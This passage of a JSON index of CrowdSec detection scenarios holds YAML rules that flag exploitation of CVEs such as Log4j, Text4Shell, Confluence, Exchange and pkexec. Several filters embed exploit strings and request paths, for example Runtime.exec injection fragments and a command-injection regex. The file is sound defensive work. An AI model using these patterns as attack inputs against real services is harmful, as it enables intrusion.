remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2019-18935\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Telerik CVE-2019-18935\"\n  service: telerik\n", "description": "Detect Telerik CVE-2019-18935 exploitation attempts", "path": "scenarios/crowdsecurity/CVE-2019-18935.yaml", "version": "0.2", "versions": {"0.1": {"digest": "58a495cc103c884661837a5951a903f04ee964f328b37a78aec71b4b03f5699a"}, "0.2": {"digest": "9558b50809bbc8fb2c2747004a3878229d19c0321b3630fcd9f66e9d359dde5b"}}}, "crowdsecurity/CVE-2021-4034": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2021-4034\ndescription: \"Detect CVE-2021-4034 exploits\"\nfilter: evt.Meta.log_type == 'CVE-2021-4034-xpl'\ngroupby: evt.Meta.target_user\nblackhole: 1m\nlabels:\n  type: privesc\n  classification:\n    - attack.T1548\n    - cve.CVE-2021-4034\n  behavior: \"generic:exploit\"\n  spoofable: 0\n  confidence: 3\n  service: linux\n  label: \"`pkexec` CVE-2021-4034\"\nscope:\n  type: system_account\n  expression: evt.Meta.target_user\n", "description": "Detect CVE-2021-4034 exploits", "path": "scenarios/crowdsecurity/CVE-2021-4034.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f08340e4247cfd2c44fb2db26dcb752aacbcfb483dc7da686af8e793b5a32d0f"}, "0.2": {"digest": "8d6e9e5be1b07382085e013fed07fdb6d5b6bf96f1b03f394b2859bcfc398475"}}}, "crowdsecurity/CVE-2022-26134": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2022-26134\ndescription: \"Confluence - RCE (CVE-2022-26134)\"\nfilter: \"Upper(PathUnescape(evt.Meta.http_path)) contains Upper('@java.lang.Runtime@getRuntime().exec(')\"\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-26134\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  service: confluence\n  label: \"Confluence - RCE\"\n", "description": "Confluence - RCE (CVE-2022-26134)", "path": "scenarios/crowdsecurity/CVE-2022-26134.yaml", "version": "0.4", "versions": {"0.1": {"digest": "ef1cbb63184361f1fca2b914b436f99bac53b98047da4442bebe58fd65a6dc2d"}, "0.2": {"digest": "d355711eafe682860cce08414e27e6f6c55c70f83ad5d96123e351a375070df3"}, "0.3": {"digest": "f6bf0d329d6bc4e172db3fb52be10ceddc669cbc26b2d1a6b369ca8815227652"}, "0.4": {"digest": "f274f2322cb28fede77941a0c5ab33a46078cf4794a6f170c856ac74c1e7b958"}}}, "crowdsecurity/CVE-2022-35914": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2022-35914\ndescription: \"Detect CVE-2022-35914 exploits\"\nfilter: \"Upper(evt.Meta.http_path) contains Upper('/vendor/htmlawed/htmlawed/htmLawedTest.php')\"\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-35914\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  service: glpi\n  label: \"GLPI CVE-2022-35914\"\n", "description": "Detect CVE-2022-35914 exploits", "path": "scenarios/crowdsecurity/CVE-2022-35914.yaml", "version": "0.2", "versions": {"0.1": {"digest": "8dcd25e2e77855c6e8216d2d988af69f93492d49cb9bd68009149124de555b61"}, "0.2": {"digest": "00fdc57bcd3cee6ec6a025e843f0f9df47223726a8847fb35d96044201aee75e"}}}, "crowdsecurity/CVE-2022-37042": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2022-37042\ndescription: \"Detect CVE-2022-37042 exploits\"\nfilter: |\n  (\n  Upper(evt.Meta.http_path) contains Upper('/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1') ||\n  Upper(evt.Meta.http_path) contains Upper('/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd') \n  )\n  and evt.Meta.http_status startsWith ('40') and\n  Upper(evt.Meta.http_verb) == 'POST'\n\nblackhole: 2m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-37042\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"ZCS CVE-2022-37042\"\n  service: zimbra\n", "description": "Detect CVE-2022-37042 exploits", "path": "scenarios/crowdsecurity/CVE-2022-37042.yaml", "version": "0.2", "versions": {"0.1": {"digest": "a359e07196179abadd5c81f4599a539f693a647cca4b744d3a0ef43e6d49496d"}, "0.2": {"digest": "b439f85b43c47467614ec9473942a8824e910a96dbac7cd852bd2f5a3266fffe"}}}, "crowdsecurity/CVE-2022-40684": {"content": "type: trigger\nname: crowdsecurity/fortinet-cve-2022-40684\ndescription: \"Detect cve-2022-40684 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n  Upper(evt.Meta.http_path) startsWith Upper('/api/v2/cmdb/system/admin/') and Lower(evt.Parsed.http_user_agent) == 'report runner'\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1548\n    - cve.CVE-2022-40684\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Fortinet CVE-2022-40684\"\n  service: fortinet\n", "description": "Detect cve-2022-40684 exploitation attempts", "path": "scenarios/crowdsecurity/CVE-2022-40684.yaml", "version": "0.3", "versions": {"0.1": {"digest": "3966ffd8e0b1b6d00ac99759955f676f39a5d350d0d2de4117c1293dd17617bb"}, "0.2": {"digest": "49e7ee3c7afd08b249c0429abb9a74de76a9bdef56f803bc802425cca7d45027"}, "0.3": {"digest": "3b7859e98c3a054e3012b7c3a0d470451ce8741b1a84c1c9c2c0a90a72ba6ce9"}}}, "crowdsecurity/CVE-2022-41082": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2022-41082\ndescription: \"Detect CVE-2022-41082 exploits\"\nfilter: |\n  Upper(evt.Meta.http_path) contains Upper('/autodiscover/autodiscover.json') &&\n  Upper(evt.Parsed.http_args) contains Upper('powershell')\n\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-41082\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  service: exchange\n  label: \"Microsoft Exchange CVE-2022-41082\"\n", "description": "Detect CVE-2022-41082 exploits", "path": "scenarios/crowdsecurity/CVE-2022-41082.yaml", "version": "0.4", "versions": {"0.1": {"digest": "4c1c2f9955b07527a943b5bb756bd1a3ac85d20ac1c32e5a4087c3e59840d53d"}, "0.2": {"digest": "429111e4d5cbbbfaaaee02eee6d646d0f75878c12ab24cd10ece4fd133b45eff"}, "0.3": {"digest": "fb8dac201728cb4b366fe199d523ec01423dd7487e76854e38e89216ba7f717d"}, "0.4": {"digest": "cb2d3cd023a7be04c41213379c1335259f0b6cd5e43ed5bc3dea096809c3c57b"}}}, "crowdsecurity/CVE-2022-41697": {"content": "type: leaky\nname: crowdsecurity/CVE-2022-41697\ndescription: \"Detect CVE-2022-41697 enumeration\"\nfilter: |\n  Upper(evt.Meta.http_path) contains Upper('/ghost/api/admin/session') &&\n  Upper(evt.Parsed.verb) == 'POST' &&\n  evt.Meta.http_status == '404'\nleakspeed: \"10s\"\ncapacity: 5\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1589\n    - cve.CVE-2022-41697\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Ghost CVE-2022-41697\"\n  service: ghost\n", "description": "Detect CVE-2022-41697 enumeration", "path": "scenarios/crowdsecurity/CVE-2022-41697.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ae9e978bd67cefe94cb65a5aefc557f873ab7622805ce053961b573e135df43e"}, "0.2": {"digest": "a2cbe3a432df8012c16607c6885302af464e9ae2730d1b2e490c8e3908b779b2"}}}, "crowdsecurity/CVE-2022-42889": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2022-42889\ndescription: \"Detect CVE-2022-42889 exploits (Text4Shell)\"\nfilter: |\n  Upper(PathUnescape(evt.Meta.http_path)) contains Upper('${script:javascript:java.lang.Runtime.getRuntime().exec(')\n  or\n  Upper(PathUnescape(evt.Meta.http_path)) contains Upper('${script:js:java.lang.Runtime.getRuntime().exec(')\n  or\n  Upper(PathUnescape(evt.Meta.http_path)) contains Upper('${url:UTF-8:') \n  or\n  Upper(PathUnescape(evt.Meta.http_path)) contains Upper('${dns:address|')\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-42889\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Text4Shell CVE-2022-42889\"\n  service: apache\n", "description": "Detect CVE-2022-42889 exploits (Text4Shell)", "path": "scenarios/crowdsecurity/CVE-2022-42889.yaml", "version": "0.3", "versions": {"0.1": {"digest": "0efbd6a607d22683331a3e4ee96a78cedc3a071dd80f302df10158628eef36d9"}, "0.2": {"digest": "7358ad76095b008ebdf384cfbda11f1f5977f3e41acaad6f83fd779fdddd656a"}, "0.3": {"digest": "f322190f4683f35f340dcd5ee9db2c34378742236c959a7f86f8c7bdfa0a07c3"}}}, "crowdsecurity/CVE-2022-44877": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2022-44877\ndescription: \"Detect CVE-2022-44877 exploits\"\nfilter: |\n  Lower(evt.Meta.http_path) contains '/index.php' &&\n  Upper(evt.Parsed.verb) == 'POST' &&\n  evt.Meta.http_status == '302' &&\n  Lower(evt.Parsed.http_args) matches 'login=.*[$|%24][\\\\(|%28].*[\\\\)|%29]'\n\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-44877\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Centos Webpanel CVE-2022-44877\"\n  service: centos\n", "description": "Detect CVE-2022-44877 exploits", "path": "scenarios/crowdsecurity/CVE-2022-44877.yaml", "version": "0.3", "versions": {"0.1": {"digest": "672740b98557f5e4d0c1e40d1a9bf01ab294e06e02dc750b92294f5a9933c0fa"}, "0.2": {"digest": "0127aac14a23d5f67218598b632e9654f82ae73a05d9113e7aeb592f4fcf5611"}, "0.3": {"digest": "44e6e53a2b1ba558678735c8749bc68cb359edf1e1fb659350199d41a71f0f12"}}}, "crowdsecurity/CVE-2022-46169": {"content": "type: leaky\nname: crowdsecurity/CVE-2022-46169-bf\ndescription: \"Detect CVE-2022-46169 brute forcing\"\nfilter: |\n  Upper(evt.Meta.http_path) contains Upper('/remote_agent.php') &&\n  Upper(evt.Parsed.verb) == 'GET' &&\n  Lower(evt.Parsed.http_args) contains 'host_id' &&\n  Lower(evt.Parsed.http_args) contains 'local_data_ids'\nleakspeed: \"10s\"\ncapacity: 5\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1592\n    - cve.CVE-2022-46169\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:bruteforce\"\n  label: \"Cacti CVE-2022-46169\"\n  service: cacti\n---\ntype: trigger\nname: crowdsecurity/CVE-2022-46169-cmd\ndescription: \"Detect CVE-2022-46169 cmd injection\"\nfilter: |\n  Upper(evt.Meta.http_path) contains Upper('/remote_agent.php') &&\n  Upper(evt.Parsed.verb) == 'GET' &&\n  Lower(evt.Parsed.http_args) contains 'action=polldata' &&\n  Lower(evt.Parsed.http_args) matches 'poller_id=.*(;|%3b)'\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-46169\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Cacti CVE-2022-46169\"\n  service: cacti\n", "description": "Detect CVE-2022-46169 brute forcing", "path": "scenarios/crowdsecurity/CVE-2022-46169.yaml", "version": "0.2", "versions": {"0.1": {"digest": "a688d850825ff127adec942a59fbe77177948e7a5eb2ab1ba33f587e1e1d34f8"}, "0.2": {"digest": "a5da5fb136d8f1c254546d080049beba49ae22b28415f787029e0e1346ce6913"}}}, "crowdsecurity/CVE-2023-22515": {"content": "## CVE-2023-22515\ntype: trigger\nname: crowdsecurity/CVE-2023-22515\ndescription: \"Detect CVE-2023-22515 exploitation\"\nfilter: |\n  Lower(evt.Parsed.file_ext) == '.action' &&\n  (Lower(evt.Parsed.file_dir) contains '/setup' || Lower(evt.Parsed.file_frag) == 'server-info') &&\n  evt.Parsed.file_frag != nil\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2023-22515\n  spoofable: 0\n  confidence: 1\n  behavior: \"http:exploit\"\n  label: \"Confluence CVE-2023-22515\"\n  service: confluence", "description": "Detect CVE-2023-22515 exploitation", "path": "scenarios/crowdsecurity/CVE-2023-22515.yaml", "version": "0.1", "versions": {"0.1": {"digest": "957c29040e254268a5595b538ebd25529d17f2dfedc1eaa97d6863623fc31f3d"}}}, "crowdsecurity/CVE-2023-22518": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2023-22518\ndescription: \"Detect CVE-2023-22518 exploits\"\nfilter: |\n  Upper(evt.Meta.http_path) contains Upper('/json/setup-restore.action') &&\n  Upper(evt.Parsed.verb) == 'POST'\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2023-22518\n  spoofable: 0\n  confidence: 1\n  behavior: \"http:exploit\"\n  label: \"Atlassian Confluence Server CVE-2023-22518\"\n  service: confluence\n", "description": "Detect CVE-2023-22518 exploits", "path": "scenarios/crowdsecurity/CVE-2023-22518.yaml", "version": "0.3", "versions": {"0.1": {"digest": "f597bf30acce708e51d463f358b5ed5840133b907df8ab8a8358565b0e506a85"}, "0.2": {"digest": "e1634f917d0008561fee2191e0988eecf4629941275e74246836f03d790d0b3b"}, "0.3": {"digest": "d2c9b75a2836e0cd0da56370168dc2fe3dc5d9d80dc187c877a2e7fcc56eaa44"}}}, "crowdsecurity/CVE-2023-23397": {"content": "type: trigger\nname: crowdsecurity/CVE-2023-23397\ndescription: \"Detect CVE-2023-23397 from sysmon events\"\nfilter: |\n  evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1' &&\n  evt.Parsed.ParentImage endsWith \"\\\\svchost.exe\" &&\n  evt.Parsed.Image endsWith \"\\\\rundll32.exe\" &&\n  evt.Parsed.CommandLine contains \"C:\\\\windows\\\\system32\\\\davclnt.dll,DavSetCookie\" &&\n  evt.Parsed.CommandLine matches '://\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}' &&\n  (not (evt.Parsed.CommandLine contains \"://10.\" ||\n        evt.Parsed.CommandLine contains \"://192.168.\" ||\n        evt.Parsed.CommandLine contains \"://172.16.\" ||\n        evt.Parsed.CommandLine contains \"://172.17.\" ||\n        evt.Parsed.CommandLine contains \"://172.18.\" ||\n        evt.Parsed.CommandLine contains \"://172.19.\" ||\n        evt.Parsed.CommandLine contains \"://172.20.\" ||\n        evt.Parsed.CommandLine contains \"://172.21.\" ||\n        evt.Parsed.CommandLine contains \"://172.22.\" ||\n        evt.Parsed.CommandLine contains \"://172.23.\" ||\n        evt.Parsed.CommandLine contains \"://172.24.\" ||\n        evt.Parsed.CommandLine contains \"://172.25.\" ||\n        evt.Parsed.CommandLine contains \"://172.26.\" ||\n        evt.Parsed.CommandLine contains \"://172.27.\" ||\n        evt.Parsed.CommandLine contains \"://172.28.\" ||\n        evt.Parsed.CommandLine contains \"://172.29.\" ||\n        evt.Parsed.CommandLine contains \"://172.30.\" ||\n        evt.Parsed.CommandLine contains \"://172.31.\" ||\n        evt.Parsed.CommandLine contains \"://127.\" ||\n        evt.Parsed.CommandLine contains \"://169.254.\"))\nlabels:\n  notification: true\n  os: windows\n  classification:\n    - attack.T1068\n    - cve.CVE-2023-23397\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Microsoft Outlook CVE-2023-23397\"\n  service: windows\nscope:\n  type: user_account\n  expression: evt.Parsed.User\n", "description": "Detect CVE-2023-23397 from sysmon events", "path": "scenarios/crowdsecurity/CVE-2023-23397.yaml", "version": "0.2", "versions": {"0.1": {"digest": "0da94e909f66b0a4d98052d94fa1e6eb63f2d64fa2a53c80971d58e8086967c2"}, "0.2": {"digest": "7c426009cb85eb2b965fa63f3ebf532e6b3f9967695550ba426811ff8ffe85e6"}}}, "crowdsecurity/CVE-2023-49103": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/CVE-2023-49103\ndescription: \"Detect owncloud CVE-2023-49103 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && Lower(evt.Meta.http_path) contains '/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/getphpinfo.php'\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2023-49103\n  spoofable: 1\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"ownCloud CVE-2023-49103\"\n  service: owncloud\n", "description": "Detect owncloud CVE-2023-49103 exploitation attempts", "path": "scenarios/crowdsecurity/CVE-2023-49103.yaml", "version": "0.3", "versions": {"0.1": {"digest": "0bc71f216c4ac89ba9b7637a411a16344b4072483f43d0f6b95b7ace6b1e473c"}, "0.2": {"digest": "4b4f399a2cfa628dbcbee420717807e060a74ff5839d742351c8cad1b42fa15d"}, "0.3": {"digest": "8183a2be1f05b043967c1708c3ed15ea28bfa0828c741fd8f1a0dd797290d915"}}}, "crowdsecurity/CVE-2023-4911": {"content": "type: trigger\nname: crowdsecurity/CVE-2023-4911\ndescription: \"exploitation of CVE-2023-4911: segfaulting in dynamic loader\"\nfilter: \"evt.Meta.log_type == 'kernel' && evt.Meta.sub_log_type == 'segfault' && evt.Meta.library startsWith 'ld-linux-'\"\nblackhole: 1m\nlabels:\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1548.004\n  behavior: \"linux:exploitation\"\n  label: \"CVE-2023-4911\"\n  service: linux\n  remediation: false\nscope:\n  type: exe\n  expression: evt.Meta.binary\n", "description": "exploitation of CVE-2023-4911: segfaulting in dynamic loader", "path": "scenarios/crowdsecurity/CVE-2023-4911.yaml", "version": "0.5", "versions": {"0.1": {"digest": "c9be24878aab5602152e6873ee337e62eb3edb0e2ce9b3d2c873ee7112660379"}, "0.2": {"digest": "c4d8818f2c6def4949741a5c1a498e3efbdbc876ca3f2cb78a0f090900aa1f3d"}, "0.3": {"digest": "74290f39f9dbf7c18f1189e533d87c40c4cd86d1bcd21ca81c02aa1de664ba9f"}, "0.4": {"digest": "5ca6fba2682acc2cec9d36109213e0046ecd323a6a4aa9c657008eb85dc59872"}, "0.5": {"digest": "f5a94401d7320b28d98147631aed97d6e9912ae842fc17efebd5239a105eed28"}}}, "crowdsecurity/CVE-2024-0012": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/CVE-2024-0012\ndescription: \"Detect CVE-2024-0012 exploitation attempts\"\nfilter: |\n  let request = Lower(evt.Parsed.request);\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && \n  evt.Meta.http_status in ['404', '403'] &&\n  (request matches '/php/.*/\\\\.js\\\\.map' || request matches '/index.php/.*\\\\.js\\\\.map')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2024-0012\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"CVE-2024-0012\"\n  service: panos\n", "description": "Detect CVE-2024-0012 exploitation attempts", "path": "scenarios/crowdsecurity/CVE-2024-0012.yaml", "version": "0.1", "versions": {"0.1": {"digest": "b955db04131ef84d41a65adb63da9bea950847ff3380be449777161fda7a96e7"}}}, "crowdsecurity/CVE-2024-38475": {"content": "type: leaky\nformat: 2.0\nname: crowdsecurity/CVE-2024-38475\ndescription: \"Detect CVE-2024-38475 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && \n  evt.Meta.http_status in ['404', '403'] &&\n  Lower(evt.Parsed.request) endsWith '%3f'\ngroupby: \"evt.Meta.source_ip\"\ndistinct: \"evt.Parsed.request\"\ncapacity: 3\nblackhole: 2m\nleakspeed: 10s\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2024-38475\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"CVE-2024-38475\"\n  service: apache\n", "description": "Detect CVE-2024-38475 exploitation attempts", "path": "scenarios/crowdsecurity/CVE-2024-38475.yaml", "version": "0.1", "versions": {"0.1": {"digest": "25a21f3a674beaf577f83b7d4be9df984baa535cd4d6bd17dfc1a935d697f5a1"}}}, "crowdsecurity/CVE-2024-9474": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/CVE-2024-9474\ndescription: \"Detect CVE-2024-9474 exploitation attempts\"\nfilter: |\n  let request = Lower(evt.Parsed.request);\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && \n  evt.Meta.http_status in ['404', '403'] &&\n  evt.Meta.http_verb == 'POST' &&\n  request contains '/php/utils/createremoteappwebsession.php/watchtowr.js.map'\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2024-9474\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"CVE-2024-9474\"\n  service: panos\n", "description": "Detect CVE-2024-9474 exploitation attempts", "path": "scenarios/crowdsecurity/CVE-2024-9474.yaml", "version": "0.1", "versions": {"0.1": {"digest": "940674a85da7a2526655fe902d8b5e197ad9048d2a09cd8132e6115cfd5d2fcf"}}}, "crowdsecurity/amavis-blocked": {"content": "type: trigger\nname: crowdsecurity/amavis-blocked\ndescription: \"Ban IPs that are blocked by amavis\"\nfilter: evt.Meta.log_type == 'amavis' && evt.Parsed.amavis_action == 'Blocked' && evt.Parsed.amavis_category == 'INFECTED'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: amavis\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1203\n    - attack.T1204\n  behavior: \"mail:malware\"\n  label: \"Infected Email\"\n  remediation: true\n", "description": "Ban IPs that are blocked by amavis", "path": "scenarios/crowdsecurity/amavis-blocked.yaml", "version": "0.1", "versions": {"0.1": {"digest": "2f09014557f8900e50f5b33ae10f86292d9274a7f32cee54d783ab26abc8cafa"}}}, "crowdsecurity/apache_log4j2_cve-2021-44228": {"content": "type: trigger\nformat: 2.0\n#debug: true\nname: crowdsecurity/apache_log4j2_cve-2021-44228\ndescription: \"Detect cve-2021-44228 exploitation attemps\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n  (\n    any(File(\"log4j2_cve_2021_44228.txt\"), { Upper(evt.Meta.http_path) contains Upper(#)})\n  or\n    any(File(\"log4j2_cve_2021_44228.txt\"), { Upper(evt.Parsed.http_user_agent) contains Upper(#)})\n  or\n    any(File(\"log4j2_cve_2021_44228.txt\"), { Upper(evt.Parsed.http_referer) contains Upper(#)})  \n  )\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/log4j2_cve_2021_44228.txt\n    dest_file: log4j2_cve_2021_44228.txt\n    type: string\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  service: apache\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2021-44228\n  behavior: \"http:exploit\"\n  label: \"Log4j CVE-2021-44228\"\n  remediation: true\n", "description": "Detect cve-2021-44228 exploitation attemps", "path": "scenarios/crowdsecurity/apache_log4j2_cve-2021-44228.yaml", "version": "0.6", "versions": {"0.1": {"digest": "7ee4024160a62e888d7db882eb4ed100de915716b91be09cef64390381babfb9"}, "0.2": {"digest": "578cd7121a0cf424affcb435c57d6a03d00569258e5b066459b9f87fe02bfacc"}, "0.3": {"digest": "16e1244697e41f006b1bfb7a4bd957d22d18b75f4dba94812a9dfc4a7135808d"}, "0.4": {"digest": "587688aca2067e8c8fba50f796ba0502e955696d4d545edf70b9b5162b0cf944"}, "0.5": {"digest": "67db0782f3610b7b183878b981e69c197599256d8e1041c0e705806f40ef4786"}, "0.6": {"digest": "1c3e13c4a6343d14c4bff1ddb46148215c2cceacff12d29d10c33de32c57fe09"}}}, "crowdsecurity/appsec-generic-test": {"content": "type: trigger\nformat: 3.0\nname: crowdsecurity/appsec-generic-test\ndescription: \"Crowdsec Generic Test Scenario for AppSec: generate an alert for appsec out of band rule for testing\"\nfilter: \"evt.Meta.log_type == 'appsec-info' && evt.Meta.rule_name == 'crowdsecurity/appsec-generic-test'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  confidence: 0\n  spoofable: 3\n  behavior: \"http:test\"\n  label: \"Crowdsec Generic Test Scenario for AppSec\"\n  service: http\n  remediation: false\n", "description": "Crowdsec Generic Test Scenario for AppSec: generate an alert for appsec out of band rule for testing", "path": "scenarios/crowdsecurity/appsec-generic-test.yaml", "version": "0.2", "versions": {"0.1": {"digest": "1593823cf50cb6cd5245a4904ae90356d75112ea816e36b603f359b7be337f1a"}, "0.2": {"digest": "2a66fd1377e99830428a58e780c69c30e2474dd3fff082efa1066e79f94b17b0"}}}, "crowdsecurity/appsec-native": {"content": "type: leaky\nformat: 3.0\nname: crowdsecurity/appsec-native\ndescription: \"Identify attacks flagged by CrowdSec AppSec via native rules\"\nfilter: \"evt.Meta.log_type == 'appsec-block' && evt.Meta.rule_name startsWith 'native_rule'\"\nleakspeed: \"30s\"\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: http\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Blocked by CrowdSec AppSec\"\n  behavior: \"http:exploit\"\n  remediation: true\n", "description": "Identify attacks flagged by CrowdSec AppSec via native rules", "path": "scenarios/crowdsecurity/appsec-native.yaml", "version": "0.2", "versions": {"0.1": {"digest": "c191be46731d87421664de83e84c80c3ff195fec2830f83d17ee57bbcf2ec42e"}, "0.2": {"digest": "4365bbab1a923176eb6b0cdc900c2fc1a1996ef599215bd9eff33b844c9ce703"}}}, "crowdsecurity/appsec-vpatch": {"content": "type: leaky\nformat: 3.0\nname: crowdsecurity/appsec-vpatch\ndescription: \"Identify attacks flagged by CrowdSec AppSec\"\n## See appsec-native.yaml for reasons why we created a negative startsWith here, we want to ignore is native_rules but catch any of our DSL rules.\nfilter: \"evt.Meta.log_type == 'appsec-block' && evt.Meta.rule_name not startsWith 'native_rule'\"\ndistinct: evt.Meta.rule_name\nleakspeed: \"60s\"\ncapacity: 1\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Blocked by CrowdSec AppSec\"\n  behavior: \"http:exploit\"\n  remediation: true\n", "description": "Identify attacks flagged by CrowdSec AppSec", "path": "scenarios/crowdsecurity/appsec-vpatch.yaml", "version": "0.6", "versions": {"0.1": {"digest": "6da853b06b3fb716d6094ebdf881df90d27239637ff3389b202b0077eda7acea"}, "0.2": {"digest": "f43baacd1a6756c8d6c51f632ad52871708b4176d490d77975491fd1c55a8e3d"}, "0.3": {"digest": "7e5f221a8a725d96df1ba2f6e32de34e02dc98abbb9598e72095ad0db94d6a13"}, "0.4": {"digest": "bff8b59bc08be10ca0fd4d365998be0545fe30f4988c4de2182ce359062a9cf1"}, "0.5": {"digest": "1bcb56461c80867d379cec5753869e7e9e036aa8c5a1382439197066c7c3489c"}, "0.6": {"digest": "3002570331efd3f821ca69c595033d668fdc972e6abe12ce7393dfe60ef2e524"}}}, "crowdsecurity/asterisk_bf": {"content": "type: leaky\nname: crowdsecurity/asterisk_bf\ndescription: \"Detect Asterisk user bruteforce\"\nfilter: evt.Meta.log_type == 'asterisk_failed_auth'\ngroupby: evt.Meta.source_ip\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: asterisk\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"sip:bruteforce\"\n  label: \"Asterisk Bruteforce\"\n  remediation: true\n", "description": "Detect Asterisk user bruteforce", "path": "scenarios/crowdsecurity/asterisk_bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "ce783ad467c8ca271aa023c57ff56305ba2b5f15c7cb6a7ca2079225437eabc8"}, "0.2": {"digest": "54d674323789711134c7aabd9ffad454c07a32aa21905dbaef15b6e1c6a3b984"}, "0.3": {"digest": 